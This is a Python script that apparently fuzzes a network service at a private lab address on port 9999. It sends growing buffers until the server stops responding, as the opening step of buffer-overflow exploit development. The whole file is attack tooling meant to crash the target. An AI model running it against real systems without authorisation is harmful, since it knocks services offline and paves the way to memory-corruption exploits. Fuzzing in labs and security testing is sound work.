#!/usr/bin/env python3
import sys, socket
from time import sleep

RHOST = "192.168.0.109"
RPORT = 9999
starting_buffer = b"^FUZZ^"

connection_timeout = 2
buffer_step_size = 100
buffer_start_size = 0
sleep_delay = 1

buffer = b"1" * buffer_start_size
socket.setdefaulttimeout(connection_timeout)

while True:
  try:
    buffer = buffer + b"1" * buffer_step_size
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    print("[-] Sending buffer with a length of: " + str(len(buffer)))
    s.send(starting_buffer.replace(b"^FUZZ^", buffer))
    s.close()
    sleep(1)
  except:
    print("[!] Last buffer probably crashed the server :)")
    sys.exit(0)